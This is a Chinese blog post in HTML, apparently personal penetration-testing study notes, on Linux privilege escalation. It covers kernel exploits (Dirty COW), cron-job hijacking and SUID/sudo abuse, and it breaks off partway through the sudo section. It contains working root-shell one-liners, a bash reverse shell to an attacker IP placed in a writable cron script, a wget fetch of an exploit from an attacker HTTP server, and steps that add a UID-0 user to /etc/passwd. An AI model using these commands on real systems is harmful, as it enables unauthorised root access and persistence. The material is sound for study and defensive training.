@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-hacker.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-hacker.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-hacker.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言Linux提权方式的复习与学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux内网渗透之提权">
+<meta property="og:url" content="http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="Scammer">
+<meta property="og:description" content="前言Linux提权方式的复习与学习。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/simg/Linux_Privilege_Escalation_2.png">
+<meta property="og:image" content="http://example.com/simg/Linux_Privilege_Escalation.png">
+<meta property="og:image" content="http://example.com/simg/Linux_Privilege_Escalation_3.png">
+<meta property="article:published_time" content="2023-08-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-29T11:50:45.775Z">
+<meta property="article:author" content="Bron">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/simg/Linux_Privilege_Escalation_2.png">
+
+<link rel="canonical" href="http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <title>Linux内网渗透之提权 | Scammer</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Scammer" type="application/atom+xml">
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#000000;--blockquote-color:#bbb;--link-color:#000000;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#ccc;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#161616;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#8a2be2;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Scammer</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">55</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">62</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">169</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Elaina.png">
+      <meta itemprop="name" content="Bron">
+      <meta itemprop="description" content="原谅我这一生不羁放纵爱自由">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Scammer">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux内网渗透之提权
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-28 00:00:00" itemprop="dateCreated datePublished" datetime="2023-08-28T00:00:00+08:00">2023-08-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-29 19:50:45" itemprop="dateModified" datetime="2023-08-29T19:50:45+08:00">2023-08-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">提权</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux提权方式的复习与学习。</p>
+<span id="more"></span>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我们在 Linux 中特权升级的最终目标是获得root用户。</p>
+<h1 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h1><p>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在apache就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限超级管理员权限。</p>
+<p>注意：没有在必要的情况下，不建议使用，因为会把目标机器搞的宕机</p>
+<p>Linux利用内核漏洞一般包括三个环节：</p>
+<ol>
+<li>对目标系统进行信息收集，获取系统内核信息和版本信息。<br>查看发行版本:<br><code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>cat /etc/redhat-release</code><br><code>cat /proc/version</code><br>lsb_release -a</li>
+</ol>
+<p>查看内核版本信息:<br><code>uname -a</code></p>
+<ol start="2">
+<li>获取EXP。<br>方法一：<br>利用Kali自带的searchsploit来搜索对应版本的exp：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit &lt;发行版本内核版本&gt;</span><br><span class="line">searchsploit -t Ubuntu 16.04 // -t 仅搜索漏洞标题</span><br><span class="line">searchsploit -s Ubuntu 16.04</span><br><span class="line">searchsploit -s Linux Kernel 4.15.0</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>方法二：<br>官网，或其它网站查找</p>
+<ol start="3">
+<li>复制到当前目录，上传编译赋权执行。<br>找到可利用的脚本之后，查看路径信息，并复制一个到当前目录（别损坏了漏洞库中原文件）：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -x linux/local/47169.c</span><br><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/47169.c ./</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>如果有其它webshell，有上传权限，那就把这个脚本拿出来，上传上去，再执行就好。</p>
+<p>如果没有其它上传途径，可以在攻击方本地开一个http服务，让目标来下载也行：（开的服务默认在根目录起始）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http-server 80</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p>之后将脚本放到根目录，然后让目标机来下载即可：<br><code>wget http://192.168.1.130/47196.c -O /tmp/47169.c</code><br>下载并保存到&#x2F;tmp目录下</p>
+<p>编译，加权限，执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc 47169.c -o exp</span><br><span class="line"><span class="built_in">chmod</span> +x exp</span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line">// <span class="built_in">id</span>测试是否提权成功</span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">Linux_Exploit_Suggester</a><br>很好用的一款提权辅助工具，用法很简单，在靶机上执行.&#x2F;linux-exploit-suggester.sh就会列出该靶机上可利用的漏洞编号.</p>
+<h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>漏洞信息：CVE-2016-5195漏洞（Dirty COW，脏牛）<br>影响范围：Linux 内核2.6.22 – 3.9 (x86&#x2F;x64)<br>漏洞EXP：<a target="_blank" rel="noopener" href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a><br>漏洞成因：<br>Linux写时拷贝技术（copy-on-write）<br>在Linux系统中，fork()会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，Linux系统中引入了“写时复制”技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。</p>
+<p>首先，搜索发行版本和内核版本，确认在Dirty Cow影响范围内。<br>利用 <code>serachsploit linux 3.2.78</code> 搜索该版本漏洞。<br>可以找到几个赃牛漏洞脚本，这里示例为40839.c脚本</p>
+<p>将该脚本下载&#x2F;上传到目标机下。</p>
+<p>然后编译该脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br><span class="line"></span><br><span class="line">-pthread  在Linux中要用到多线程时，需要链接pthread库</span><br><span class="line">-o 40839  gcc生成的目标文件,名字为40839</span><br><span class="line">-lcrypt   添加需要的外部库</span><br></pre></td></tr></table></figure>
+
+<p>添加可执行权限并执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./dirty</span><br><span class="line">./dirty 999999</span><br></pre></td></tr></table></figure>
+
+<p>之后就可以直接用密码999999登录root权限账户firefart</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br><span class="line">999999</span><br></pre></td></tr></table></figure>
+
+<p>在运行漏洞利用后恢复 &#x2F;etc&#x2F;passwd<br><code>mv /tmp/passwd.bak /etc/passwd</code></p>
+<h1 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>定时任务(Cron job)是Linux系统中的一个守护进程，用于调度重复任务，通过控制crontab可以让系统周期性地执行某些命令或脚本。cron是Linux系统中最为实用的工具之一，但是也可能被黑客用于提权操作。由于cron通常以root特权运行，如果我们可以修改其调度的任何脚本或二进制文件，那么便可以使用root权限执行任意代码。<br>默认情况下，使用环境变量有限的&#x2F;bin&#x2F;shshell</p>
+<p>Cron tables存储了Cron jobs的配置<br>User Crontabs通常位于&#x2F;var&#x2F;spool&#x2F;cron&#x2F;or&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;<br>system系统的crontab位于&#x2F;etc&#x2F;crontab</p>
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><ol>
+<li><p>运用如下命令列出计划任务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /etc/cron*</span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在服务器上查找overwrite.sh 文件：<br><code>locate overwrite.sh</code><br><code>/usr/local/bin/overwrite.sh</code></p>
+</li>
+<li><p>检查文件的权限<br><code>ls -l /usr/local/bin/overwrite.sh</code><br>注意：这个文件是可写的</p>
+</li>
+<li><p>将 overwrite.sh文件的内容替换为：<br><code>#!/bin/bash bash -i &gt;&amp; /dev/tcp/192.168.175.130/4444 0&gt;&amp;1</code></p>
+</li>
+<li><p>kali上运行nc<br>等待 cron jobs运行，返回root权限</p>
+</li>
+<li><p>定时任务创建<br>编写一个脚本test.py ，将其权限置为所有用户可读可写可操作： <code>chmod 777 test.py</code></p>
+</li>
+</ol>
+<p>而后修改crontab文件，将定时任务注册到系统中：<code>vim /etc/crontab</code><br>在末尾加上 <code>*/1 *   * * *   root    python  /home/ubuntu/test.py</code><br>表示每1分钟运行一次test.py。<br>至此，定时任务创建成功。</p>
+<ol start="3">
+<li>提权操作<br>假设通过之前的渗透操作，获得了低权限的用户ubuntu。<br>查看crontab文件： <code>cat /etc/crontab</code><br>发现存在定时任务，以root身份定时运行 <code>/home/ubuntu/test.py</code><br>而test.py文件是任意成员可写的，于是向其代码尾部追加以下内容：<br><code>os.chmod(“/etc/passwd”,stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)</code><br>将passwd文件权限设置为任意成员可写。</li>
+</ol>
+<p>一分钟之后，程序自动运行，发现passwd已经任意成员可写。</p>
+<p>接下来需要做的就是构造一个用户，在密码占位符处指定密码，UID设置为0，并将其添加到 &#x2F;etc&#x2F;passwd 文件中。</p>
+<p>首先，使用perl语言生成带有盐值的密码：<br><code>perl -le &#39;print crypt(&quot;hack&quot;,&quot;addedsalt&quot;)&#39;</code></p>
+<p>而后，拼接密码，将以下字符串写入&#x2F;etc&#x2F;passwd文件，之后便拥有了一个超级用户hack：hack。<br><code>hack:adCP9//qaScc2:0:0:User_like_root:/root:/bin/bash</code></p>
+<p>最后，登录hack用户，自动跳转到root用户，提权成功！</p>
+<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>SUID（Set UID, 设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。为可执行文件添加suid权限的目的是简化操作流程，让普通用户也能做一些高权限才能做的的工作。但是如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p>
+<p>SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：</p>
+<p>（A）Real UID：执行该进程的用户的UID。Real UID只用于标识用户，不用于权限检查。</p>
+<p>（B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID。</p>
+<p>（C）Saved UID：在高权限用户降权后，保留的UID。</p>
+<p>如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell。root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权。</p>
+<p>1、SUID权限仅对二进制程序(binary program)有效；<br>2、执行者对于该程序需要具有执行(x)的可执行权限；<br>3、本权限仅在执行该程序的过程中有效(run-time)；<br>4、执行者将具有该程序拥有者(owner)的权限。</p>
+<p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。</p>
+<h2 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h2><p>通过以下命令，可找到具有SUID权限的参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三选一</span></span><br><span class="line"><span class="comment"># /表示从文件系统的顶部（根）开始并找到每个目录</span></span><br><span class="line"><span class="comment"># -perm 表示搜索随后的权限</span></span><br><span class="line"><span class="comment"># -u = s表示查找root用户拥有的文件</span></span><br><span class="line"><span class="comment"># -type表示我们正在寻找的文件类型</span></span><br><span class="line"><span class="comment"># f 表示常规文件，而不是目录或特殊文件</span></span><br><span class="line"><span class="comment"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span></span><br></pre></td></tr></table></figure>
+
+<p>SUID设置方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s &lt;filename&gt;</span><br><span class="line"><span class="built_in">chmod</span> u-s &lt;filename&gt;</span><br></pre></td></tr></table></figure>
+
+<p>常见SUID提权文件有：<br>nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget</p>
+<ol>
+<li>nmap<br>旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令。由于 Nmap 位于以 root 权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的 shell。</li>
+</ol>
+<p><code>nmap --interactive  # 启动交互模式</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>或者有一个 Metasploit 模块，它通过 SUID Nmap 二进制文件执行权限提升。<br><code>exploit/unix/local/setuid_nmap</code></p>
+<ol start="2">
+<li>find<br>实用程序find可用于发现存储在系统上。然而，它是执行命令的能力。因此，如果它被配置为使用 SUID 权限运行，那么所有将通过 find 执行的命令都将以 root 身份执行。</li>
+</ol>
+<p>非root权限下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> abc</span><br><span class="line">find abc -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"></span><br><span class="line">find . -<span class="built_in">exec</span> /bin/sh -p \; -quit 	<span class="comment"># 输入命令，返回shell</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>vim<br>Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。</li>
+</ol>
+<p><code>vim.tiny /etc/shadow</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还可以通过vim来打开shell</span></span><br><span class="line"></span><br><span class="line">vim.tiny</span><br><span class="line"></span><br><span class="line"><span class="comment"># Press ESC key</span></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p>bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p 		<span class="comment"># 进入bash命令交互模式</span></span><br><span class="line">bash-3.2<span class="comment"># id 	# 以root权限执行id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) <span class="built_in">groups</span>=1002(service)	<span class="comment"># 结果</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>less &amp; more</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>make</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COMMAND=<span class="string">&#x27;/bin/sh -p&#x27;</span></span><br><span class="line">make -s -<span class="built_in">eval</span>=$<span class="string">&#x27;x:\n\t-&#x27;</span><span class="string">&quot;<span class="variable">$COMMAND</span>&quot;</span> 	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>flock</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flock -u / /bin/sh -p 	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>env</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> /bin/sh -p 	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>python</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27;</span>  	<span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="Sudo滥用提权"><a href="#Sudo滥用提权" class="headerlink" title="Sudo滥用提权"></a>Sudo滥用提权</h1><h2 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h2><p>sudo 是一个程序，允许用户运行具有其他用户安全特权的其他程序。</p>
+<p>默认情况下，该其他用户将是root用户<br>用户通常需要输入密码才能使用sudo，并且必须允许用户通过&#x2F;etc&#x2F;sudoersfile文件中的规则访问。<br>规则可用于将用户限制在某些程序中，并放弃密码输入要求。<br>在一般用户需要取得特殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码（以确认终端机前的是该用户本人），回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内（默认为5分钟，可在&#x2F;etc&#x2F;sudoers自定义），使用sudo不需要再次输入密码。</p>
+<h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo &lt;program&gt;  	<span class="comment"># 使用sudo运行程序</span></span><br><span class="line">sudo -u &lt;username&gt; &lt;program&gt; 	<span class="comment"># 以特定用户的身份运行程序</span></span><br><span class="line">sudo -l 			<span class="comment"># 允许（且不允许）运行列出用户的程序</span></span><br><span class="line">sudo su 			<span class="comment"># 通过使用交换用户su命令生成root</span></span><br><span class="line">sudo -s sudo -i sudo /bin/bash sudo passwd 	<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+<p>在sudoers中增加以下内容，可以使用户user_test可以从任何终端运行，以root用户身份运行命令find 而无需密码。</p>
+<p><code>user_test  ALL = (root) NOPASSWD: /usr/bin/find</code></p>
+<p>可以利用sudo提权的命令如下：<br><code>wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp</code></p>
+<h3 id="权限配置"><a href="#权限配置" class="headerlink" title="权限配置"></a>权限配置</h3><p>新建普通用户sudo_test，而后切换到root用户，执行以下动作：</p>
+<p>添加文件的写权限： <code>chmod u+w /etc/sudoers</code></p>
